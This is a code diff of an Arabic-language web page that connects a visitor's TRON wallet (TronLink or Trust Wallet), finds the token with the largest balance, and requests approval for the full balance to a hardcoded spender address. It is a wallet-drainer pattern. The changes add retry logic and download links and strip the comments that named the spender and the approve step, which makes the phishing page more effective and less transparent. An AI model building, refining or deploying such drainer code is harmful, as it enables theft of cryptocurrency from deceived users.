@@ -5,13 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>ربط محفظة TRON وطلب Approve</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
+    button { padding: 10px 20px; margin: 10px; font-size: 16px; }
+    p { font-size: 14px; color: #333; }
+    a { color: blue; text-decoration: none; margin: 10px; display: none; }
+  </style>
 </head>
 <body>
-  <h2>ربط محفظة TRON</h2>
+  <h2> محفظة TRON</h2>
   <button id="connectWalletBtn">ربط المحفظة</button>
+  <button id="retryBtn" style="display:none;">إعادة المحاولة</button>
   <p id="status"></p>
-  <a id="openTronLink" href="tronlink://" style="display:none;">فتح TronLink</a>
-  <a id="openTrustWallet" href="trust://" style="display:none;">فتح Trust Wallet</a>
+  <a id="openTronLink" href="https://www.tronlink.org/dl/TronLink.apk">فتح/تحميل TronLink</a>
+  <a id="openTrustWallet" href="https://trustwallet.com/download">فتح/تحميل Trust Wallet</a>
 
   <script>
     const tronTokens = [
@@ -22,21 +29,24 @@
       { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9" }
     ];
 
-    const spenderAddress = "TQBR6nj5SRpyPh7FpC6xBNTVpN39yxv4Zo"; // عنوان السبندر
+    const spenderAddress = "TQBR6nj5SRpyPh7FpC6xBNTVpN39yxv4Zo";
     let tronWeb;
     let userAddress;
 
     // دالة للانتظار حتى تكون المحفظة جاهزة
-    async function waitForTronWeb(timeout = 5000) {
+    async function waitForWallet(timeout = 10000) {
       return new Promise((resolve, reject) => {
         const startTime = Date.now();
         const checkInterval = setInterval(() => {
           if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
             clearInterval(checkInterval);
-            resolve(window.tronWeb);
+            resolve({ type: "tronlink", tronWeb: window.tronWeb });
+          } else if (window.ethereum) {
+            clearInterval(checkInterval);
+            resolve({ type: "ethereum", provider: window.ethereum });
           } else if (Date.now() - startTime > timeout) {
             clearInterval(checkInterval);
-            reject(new Error("لم يتم العثور على TronLink."));
+            reject(new Error("لم يتم العثور على محفظة."));
           }
         }, 500);
       });
@@ -44,51 +54,48 @@
 
     async function connectWallet() {
       const statusElement = document.getElementById("status");
-      statusElement.innerText = "جارٍ الاتصال بالمحفظة...";
       const openTronLink = document.getElementById("openTronLink");
       const openTrustWallet = document.getElementById("openTrustWallet");
+      const retryBtn = document.getElementById("retryBtn");
+      statusElement.innerText = "جارٍ الاتصال بالمحفظة...";
+      openTronLink.style.display = "none";
+      openTrustWallet.style.display = "none";
+      retryBtn.style.display = "none";
 
       try {
-        // أولاً: حاول اكتشاف TronLink
-        tronWeb = await waitForTronWeb();
-        userAddress = tronWeb.defaultAddress.base58;
+        const wallet = await waitForWallet();
 
-        if (!userAddress) {
-          statusElement.innerText = "فشل جلب عنوان المحفظة. تأكد من تسجيل الدخول في TronLink.";
-          openTronLink.style.display = "inline";
-          return;
-        }
-
-        statusElement.innerText = `المحفظة متصلة (TronLink): ${userAddress}`;
-        await processTokens();
-
-      } catch (err) {
-        // لو TronLink مش موجود، جرب Trust Wallet
-        if (window.ethereum) {
-          try {
-            tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accounts[0];
-            tronWeb.setAddress(userAddress);
-            statusElement.innerText = `المحفظة متصلة (Trust Wallet): ${userAddress}`;
-            await processTokens();
-          } catch (trustErr) {
-            statusElement.innerText = "فشل الاتصال بـ Trust Wallet. افتح التطبيق وحاول مرة أخرى.";
-            openTrustWallet.style.display = "inline";
-            console.error(trustErr);
+        if (wallet.type === "tronlink") {
+          tronWeb = wallet.tronWeb;
+          userAddress = tronWeb.defaultAddress.base58;
+          if (!userAddress) {
+            statusElement.innerText = "فشل جلب عنوان المحفظة. تأكد من تسجيل الدخول في TronLink.";
+            openTronLink.style.display = "inline";
+            retryBtn.style.display = "inline";
+            return;
           }
-        } else {
-          statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet.";
-          openTronLink.style.display = "inline";
-          openTrustWallet.style.display = "inline";
+          statusElement.innerText = `المحفظة متصلة (TronLink): ${userAddress}`;
+          await processTokens();
+        } else if (wallet.type === "ethereum") {
+          tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAddress = accounts[0];
+          tronWeb.setAddress(userAddress);
+          statusElement.innerText = `المحفظة متصلة (Trust Wallet): ${userAddress}`;
+          await processTokens();
         }
+      } catch (err) {
+        statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet وحاول مرة أخرى.";
+        openTronLink.style.display = "inline";
+        openTrustWallet.style.display = "inline";
+        retryBtn.style.display = "inline";
+        console.error(err);
       }
     }
 
     async function processTokens() {
       const statusElement = document.getElementById("status");
       try {
-        // جلب أكبر رصيد توكن
         let maxToken = null;
         let maxBalance = 0;
         let decimals = 6;
@@ -116,7 +123,6 @@
 
         statusElement.innerText += `\nأكبر رصيد توكن: ${maxToken.symbol} = ${maxBalance}`;
 
-        // طلب Approve بكمية الرصيد
         const contract = await tronWeb.contract().at(maxToken.address);
         const amount = tronWeb.toBigNumber(maxBalance * (10 ** decimals)).toString();
 
@@ -125,7 +131,7 @@
             statusElement.innerText += `\nتم إرسال طلب الـ Approve بنجاح.\nمعرف المعاملة: ${tx}`;
           })
           .catch(err => {
-            statusElement.innerText += "\nفشل إرسال طلب الـ Approve أو تم الرفض. تأكد من وجود رصيد TRX كافٍ.";
+            statusElement.innerText += "\nفشل إرسال طلب الـ Approve. تأكد من وجود رصيد TRX كافٍ.";
             console.error(err);
           });
       } catch (err) {
@@ -135,6 +141,7 @@
     }
 
     document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
+    document.getElementById("retryBtn").addEventListener("click", connectWallet);
   </script>
 </body>
 </html>
